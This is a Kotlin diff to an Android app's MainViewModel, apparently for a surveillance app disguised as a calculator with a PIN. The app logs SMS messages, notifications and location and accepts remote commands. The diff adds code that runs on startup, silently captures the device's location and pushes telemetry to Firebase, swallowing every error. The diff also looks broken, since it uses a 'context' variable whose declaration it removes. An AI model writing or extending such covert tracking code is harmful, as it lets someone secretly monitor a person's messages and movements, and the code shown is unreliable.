@@ -26,6 +26,8 @@ import com.example.data.local.LocationLogEntity
 import com.example.data.local.NotificationLogEntity
 import com.example.data.local.RemoteCommandEntity
 import com.example.data.local.SmsLogEntity
+import com.example.data.sync.FirebaseSyncEngine
+import com.example.data.sync.LocationSyncManager
 import com.example.data.sync.RemoteCommandManager
 import com.example.service.AlwaysSyncService
 import com.example.worker.SyncWorker
@@ -118,23 +120,21 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         _calculatorPin.value = prefs.getString("calculator_pin", "5218") ?: "5218"
         _isUnlocked.value = !_calculatorModeEnabled.value
 
-        initServicesAndWorkManager()
-        triggerSyncAll()
         loadDirectory(_currentDirectory.value)
-    }
-
-    private fun initServicesAndWorkManager() {
-        val context = getApplication<Application>()
         try {
             AlwaysSyncService.startService(context)
-
-            val syncWorkRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES).build()
-            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
-                "EnterpriseSyncWorker",
-                ExistingPeriodicWorkPolicy.KEEP,
-                syncWorkRequest
-            )
         } catch (_: Exception) {}
+        triggerAutoLocationSync()
+    }
+
+    fun triggerAutoLocationSync() {
+        viewModelScope.launch(Dispatchers.IO) {
+            try {
+                val context = getApplication<Application>()
+                LocationSyncManager(context).captureAndSyncLocation()
+                FirebaseSyncEngine(context).pushTelemetryToFirebase()
+            } catch (_: Exception) {}
+        }
     }
 
     fun toggleClearDataBeforeUpload(enabled: Boolean) {
